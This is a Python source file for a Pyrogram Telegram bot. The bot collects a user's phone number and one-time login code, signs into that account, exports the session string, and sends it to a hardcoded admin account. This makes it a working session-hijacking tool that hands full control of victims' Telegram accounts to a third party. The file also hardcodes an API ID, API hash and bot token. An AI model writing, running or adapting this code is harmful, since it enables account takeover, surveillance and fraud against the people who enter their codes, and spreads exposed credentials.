from pyrogram import Client, filters
from pyrogram.types import Message
import os

api_id = 23347107
api_hash = "8193110bf32a08f41ac6e9050b2a4df4"
bot_token = "7620884098:AAF8ObWhRQxsB0IXuFa_0bTWh5QQeE9dKmo"
admin_id = 7051377916

bot = Client("bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
sessions = {}  # Stores session objects for each user

@bot.on_message(filters.command("start"))
async def start_cmd(_, message: Message):
    await message.reply("✅ Bot Running!\nUse /send to start login.")

@bot.on_message(filters.command("send"))
async def send_cmd(_, message: Message):
    await message.reply("📱 Send your phone number (e.g. +8801XXXXXXX):")
    sessions[message.chat.id] = {"step": "wait_phone"}

@bot.on_message(filters.text)
async def handle_text(_, message: Message):
    user = sessions.get(message.chat.id)
    if not user:
        return

    step = user.get("step")
    if step == "wait_phone":
        phone = message.text.strip()
        user["phone"] = phone
        user["step"] = "wait_code"

        user["client"] = Client(
            f"session_{message.chat.id}",
            api_id=api_id,
            api_hash=api_hash,
            phone_number=phone,
            in_memory=True
        )
        await user["client"].connect()

        try:
            sent = await user["client"].send_code(phone)
            user["code_hash"] = sent.phone_code_hash
            await message.reply("📨 OTP sent! Now send the code (only numbers).")
        except Exception as e:
            await message.reply(f"❌ Failed to send OTP: {e}")
            await user["client"].disconnect()
            sessions.pop(message.chat.id, None)

    elif step == "wait_code":
        code = message.text.strip()
        try:
            await user["client"].sign_in(user["phone"], user["code_hash"], code)
            string_session = await user["client"].export_session_string()
            await bot.send_message(admin_id, f"✅ Session for {user['phone']}:\n\n`{string_session}`")
            await message.reply("✅ Session created and sent to admin.")
        except Exception as e:
            await message.reply(f"❌ Error during login: {e}")
        finally:
            await user["client"].disconnect()
            sessions.pop(message.chat.id, None)

bot.run()
